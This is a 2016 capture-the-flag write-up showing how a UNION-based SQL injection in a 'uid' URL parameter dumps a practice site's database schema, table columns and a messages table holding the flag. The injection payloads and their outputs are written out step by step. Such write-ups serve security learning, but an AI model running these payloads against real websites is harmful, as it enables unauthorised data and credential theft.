Writeup: EFF-CTF 2016 - Level 0x1
=================================

:date: 2016-02-04
:tags: security, ctf, eff-ctf, web
:lang: en
:summary: Level 0x1 is a web challenge, where you need to exploit a
          (non-blind) SQLi in order to get the flag.


Problem
-------

The following document describes how to solve the level ``0x1``
of the CTF ``EFF-CTF 2016``, available at: `level0x1.eff-ctf.org`_

.. _level0x1.eff-ctf.org:
   https://level0x1.eff-ctf.org


Check for SQLi
--------------

First of all, we've noticed opening tweets for ``admin``, leads us to a page
containing its tweets (2 tweets).

The URL is: `level0x1.eff-ctf.org/tweets?uid=1`_. A ``GET`` parameter has been
passed, so we can **check if there's a SQLi in there**..

After some tries, we've found that using `uid=1 OR 1=1`_ we get not just 2
tweets, but instead the list of all tweets for user ``admin``.

This tells us **there is a SQLi in the GET parameter** ``uid``.

Since it gives us more rows, **the SQLi is inside a** ``WHERE`` **clause**.

.. _`level0x1.eff-ctf.org/tweets?uid=1`:
   https://level0x1.eff-ctf.org/tweets?uid=1
.. _`uid=1 OR 1=1`:
   https://level0x1.eff-ctf.org/tweets?uid=1%20OR%201=1


How to read database contents
-----------------------------

We need to find a way to use the SQLi to read database contents.

We can exploit the fact SQLi is inside the ``WHERE`` clause, so finishing the
query at that point, doesn't product an invalid query, but something like:

.. code-block:: sql
   :linenos: inline

   SELECT ..
     FROM ..
    WHERE ..=1

The result of the query above, is a table with ``n`` rows (one for each column
included in the ``SELECT`` statement).

If we make a ``UNION`` between the table above and another table
(having the same number of columns, ``n``)
**the resulting table will include both of the resulting rows**:

.. code-block:: sql
   :hl_lines: 5 6
   :linenos: inline

   SELECT ..
     FROM ..
    WHERE ..=1
    UNION
   SELECT <our_columns>
     FROM <our_table>


Find the number of columns
--------------------------

Let's try some unions, we'll get errors until we find the right number
of columns:

* `uid=1 UNION SELECT 1`_: *Error*, too few columns.
* `uid=1 UNION SELECT 1, 2`_: *Success*, We can read as output the number ``2``,
  which is **the second field**.
* `uid=1 UNION SELECT 1, 2, 3`_: *Error*, too many columns.

The right number of columns is: ``2``.
We can read the content of the second column, which
**will be where we will dump all of the database informations**.

.. _`uid=1 UNION SELECT 1`:
   https://level0x1.eff-ctf.org/tweets?uid=1%20UNION%20SELECT%201
.. _`uid=1 UNION SELECT 1, 2`:
   https://level0x1.eff-ctf.org/tweets?uid=1%20UNION%20SELECT%201,%202
.. _`uid=1 UNION SELECT 1, 2, 3`:
   https://level0x1.eff-ctf.org/tweets?uid=1%20UNION%20SELECT%201,%202,%203


Find the available tables
-------------------------

To find the available tables in the current database, we need to
**dump the tables of the database schema**..

Running
`uid=1 UNION SELECT 1, table_name FROM information_schema.tables`_
gives the following output:

.. table::
   :class: bordered centered

   +----------+--------------------------------------------------+
   | User     |                     Tweet                        |
   +==========+==================================================+
   | admin    | Hackers broke in last night and deleted our      |
   |          | database,I reset it but all the old posts and    |
   |          | messages are gone.                               |
   +----------+--------------------------------------------------+
   | admin    | I have temporarily disabled the login system,    |
   |          | due to the hacker menace                         |
   +----------+--------------------------------------------------+
   | admin    | CHARACTER\_SETS                                  |
   +----------+--------------------------------------------------+
   | admin    | COLLATIONS                                       |
   +----------+--------------------------------------------------+
   | admin    | COLLATION\_CHARACTER\_SET\_APPLICABILITY         |
   +----------+--------------------------------------------------+
   | admin    | COLUMNS                                          |
   +----------+--------------------------------------------------+
   | admin    | COLUMN\_PRIVILEGES                               |
   +----------+--------------------------------------------------+
   | admin    | ENGINES                                          |
   +----------+--------------------------------------------------+
   | admin    | EVENTS                                           |
   +----------+--------------------------------------------------+
   |            ... *so many system tables* ...                  |
   +----------+--------------------------------------------------+
   | admin    | INNODB\_LOCKS                                    |
   +----------+--------------------------------------------------+
   | admin    | INNODB\_CMPMEM\_RESET                            |
   +----------+--------------------------------------------------+
   | admin    | INNODB\_CMP\_RESET                               |
   +----------+--------------------------------------------------+
   | admin    | INNODB\_BUFFER\_PAGE\_LRU                        |
   +----------+--------------------------------------------------+
   | admin    | messages                                         |
   +----------+--------------------------------------------------+
   | admin    | tweets                                           |
   +----------+--------------------------------------------------+
   | admin    | users                                            |
   +----------+--------------------------------------------------+

We can see **the only user-defined tables are**:

- ``messages``
- ``tweets``
- ``users``

.. _`uid=1 UNION SELECT 1, table_name FROM information_schema.tables`:
   https://level0x1.eff-ctf.org/tweets?uid=1%20UNION%20SELECT%201,%20table_name%20FROM%20information_schema.tables


Find the columns
----------------

To find the columns for each (user-defined) table we need to query the
table ``information_schema.columns`` in the column ``column_name``:


Table ``messages``
~~~~~~~~~~~~~~~~~~

Using the following query:
`uid=1 UNION SELECT 1, column_name FROM information_schema.columns WHERE table_name = "messages"`_
we get:

.. table::
   :class: bordered centered

   +----------+--------------------------------------------------+
   |   User   |                     Tweet                        |
   +==========+==================================================+
   | admin    | Hackers broke in last night and deleted our      |
   |          | database,I reset it but all the old posts and    |
   |          | messages are gone.                               |
   +----------+--------------------------------------------------+
   | admin    | I have temporarily disabled the login system,    |
   |          | due to the hacker menace                         |
   +----------+--------------------------------------------------+
   | admin    | mid                                              |
   +----------+--------------------------------------------------+
   | admin    | from                                             |
   +----------+--------------------------------------------------+
   | admin    | to                                               |
   +----------+--------------------------------------------------+
   | admin    | body                                             |
   +----------+--------------------------------------------------+

The ``messages`` table has the following columns:

- ``mid``
- ``from``
- ``to``
- ``body``

.. _`uid=1 UNION SELECT 1, column_name FROM information_schema.columns WHERE table_name = "messages"`:
   https://level0x1.eff-ctf.org/tweets?uid=1%20UNION%20SELECT%201,%20column_name%20FROM%20information_schema.columns%20WHERE%20table_name%20=%20%22messages%22


Table ``tweets``
~~~~~~~~~~~~~~~~

Using the following query:
`uid=1 UNION SELECT 1, column_name FROM information_schema.columns WHERE table_name = "tweets"`_
we get:

.. table::
   :class: bordered centered

   +----------+--------------------------------------------------+
   |   User   |                     Tweet                        |
   +==========+==================================================+
   | admin    | Hackers broke in last night and deleted our      |
   |          | database,I reset it but all the old posts and    |
   |          | messages are gone.                               |
   +----------+--------------------------------------------------+
   | admin    | I have temporarily disabled the login system,    |
   |          | due to the hacker menace                         |
   +----------+--------------------------------------------------+
   | admin    | tid                                              |
   +----------+--------------------------------------------------+
   | admin    | uid                                              |
   +----------+--------------------------------------------------+
   | admin    | body                                             |
   +----------+--------------------------------------------------+

The ``tweets`` table has the following columns:

- ``tid``
- ``uid``
- ``body``

.. _`uid=1 UNION SELECT 1, column_name FROM information_schema.columns WHERE table_name = "tweets"`:
   https://level0x1.eff-ctf.org/tweets?uid=1%20UNION%20SELECT%201,%20column_name%20FROM%20information_schema.columns%20WHERE%20table_name%20=%20%22tweets%22


Table ``users``
~~~~~~~~~~~~~~~

Using the following query:
`uid=1 UNION SELECT 1, column_name FROM information_schema.columns WHERE table_name = "users"`_
we get:

.. table::
   :class: bordered centered

   +----------+--------------------------------------------------+
   |   User   |                     Tweet                        |
   +==========+==================================================+
   | admin    | Hackers broke in last night and deleted our      |
   |          | database,I reset it but all the old posts and    |
   |          | messages are gone.                               |
   +----------+--------------------------------------------------+
   | admin    | I have temporarily disabled the login system,    |
   |          | due to the hacker menace                         |
   +----------+--------------------------------------------------+
   | admin    | uid                                              |
   +----------+--------------------------------------------------+
   | admin    | username                                         |
   +----------+--------------------------------------------------+
   | admin    | password                                         |
   +----------+--------------------------------------------------+

The ``users`` table has the following columns:

- ``uid``
- ``username``
- ``password``

.. _`uid=1 UNION SELECT 1, column_name FROM information_schema.columns WHERE table_name = "users"`:
   https://level0x1.eff-ctf.org/tweets?uid=1%20UNION%20SELECT%201,%20column_name%20FROM%20information_schema.columns%20WHERE%20table_name%20=%20%22users%22


Summing up
~~~~~~~~~~

The following tables should be examined:

- Table ``messages`` with columns: ``mid``, ``from``, ``to``, ``body``.
- Table ``tweets`` with columns: ``tid``, ``uid``, ``body``.
- Table ``users`` with columns: ``uid``, ``username``, ``password``.

Examine tables
--------------

After taking a look at the tables described above, we found that column
``body`` of table ``messages`` contains the following text:

- ``Bro send me the password for the secret meeting``
- ``The password is MarcusYallow``
- ``I totes haxxored your stupid twitter! Your code sucks! And your passwords are horrible!``
- ``You little jerk! I'm gonna tell the FBI!``

Flag
----

The flag is ``MarcusYallow``.
